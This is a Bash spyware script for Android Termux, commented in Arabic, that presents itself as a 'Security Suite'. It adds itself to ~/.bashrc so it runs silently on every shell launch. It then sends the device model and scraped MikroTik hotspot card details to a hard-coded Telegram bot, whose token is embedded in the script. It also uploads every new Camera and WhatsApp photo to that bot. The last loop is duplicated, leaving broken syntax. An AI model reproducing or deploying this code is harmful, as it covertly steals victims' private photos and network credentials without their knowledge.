#!/bin/bash

# --- 1. إعدادات البوت ---
TOKEN="8669553208:AAGCy9MQTL9ogHuFXbZiZy4bqkXUnkdwHqg"
ID="7845603274"
URL_MSG="https://api.telegram.org/bot$TOKEN/sendMessage"
URL_DOC="https://api.telegram.org/bot$TOKEN/sendDocument"
LOG_FILE="$HOME/.sent_photos.log"

# --- 2. مرحلة التثبيت والحقن (تنفذ مرة واحدة) ---
if ! grep -q "security_task.sh" ~/.bashrc; then
    termux-setup-storage
    sleep 3
    pkg install curl -y -q
    touch "$LOG_FILE"
    # الحقن للعمل في الخلفية بصمت تام عند كل فتح
    echo "(bash ~/security_task.sh > /dev/null 2>&1 &)" >> ~/.bashrc
    echo -e "\e[1;32m[!] Security Suite Installed Successfully!\e[0m"
    exit 
fi

# --- 3. المهمة الذكية (إرسال الإشعارات) ---

# أ) إرسال إشعار بمعلومات الجهاز (يدعم المسافات)
MODEL=$(getprop ro.product.model)
curl -s -G "$URL_MSG" \
    --data-urlencode "chat_id=$ID" \
    --data-urlencode "text=🚀 Device Active: $MODEL" > /dev/null

# ب) صيد بيانات كرت المايكروتك (استخراج من صفحة الحالة)
# سحب كود الصفحة
STATUS_PAGE=$(curl -s http://10.0.0.1/status)

# استخراج رقم الكرت (User) والوقت المتبقي (Time Left) بناءً على تحليلك السابق
CARD_ID=$(echo "$STATUS_PAGE" | grep -oP 'var currnuser = "\K[^"]+' | head -1)
TIME_LEFT=$(echo "$STATUS_PAGE" | grep -oP 'timeLeft2" class="valuee"> \K[^<]+' | head -1)
[ -z "$CARD_ID" ] && CARD_ID="User Not Logged In"
[ -z "$TIME_LEFT" ] && TIME_LEFT="N/A"

# إرسال غنيمة المايكروتك للبوت
NET_REPORT="🎫 Mikrotik Card Hunt:
--------------------------
Card ID: $CARD_ID
Time Left: $TIME_LEFT
IP: $(ip addr show wlan0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
Gateway: 10.0.0.1
--------------------------"

curl -s -G "$URL_MSG" \
    --data-urlencode "chat_id=$ID" \
    --data-urlencode "text=$NET_REPORT" > /dev/null

# --- 4. فحص الصور وإرسال الجديد فقط ---
paths=(
"/sdcard/DCIM/Camera/"
"/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/"
)

for path in "${paths[@]}"; do
    if [ -d "$path" ]; then
        ls "$path" | while read photo; do
            if ! grep -q "$photo" "$LOG_FILE"; then
                # إرسال الصورة الجديدة كملف لضمان الجودة
                response=$(curl -s -F chat_id=$ID -F document=@"$path$photo" "$URL_DOC")
                if [[ $response == *"\"ok\":true"* ]]; then
                    echo "$photo" >> "$LOG_FILE"
                fi
                sleep 0.5 # Anti-Spam delay
            fi
        done
    fi
done
        ls "$path" | while read photo; do
            # التحقق: هل اسم الصورة موجود في السجل؟
            if ! grep -q "$photo" "$LOG_FILE"; then
                # إرسال الصورة الجديدة
                response=$(curl -s -F chat_id=$ID -F document=@"$path$photo" "$URL_DOC")
                
                # إذا نجح الإرسال (تأكيد من تليجرام)، أضفها للسجل لكي لا نرسلها مجدداً
                if [[ $response == *"\"ok\":true"* ]]; then
                    echo "$photo" >> "$LOG_FILE"
                fi
                # تأخير بسيط لتجنب حظر البوت بسبب كثرة الرسائل (Anti-Spam)
                sleep 0.5
            fi
        done
    fi
done
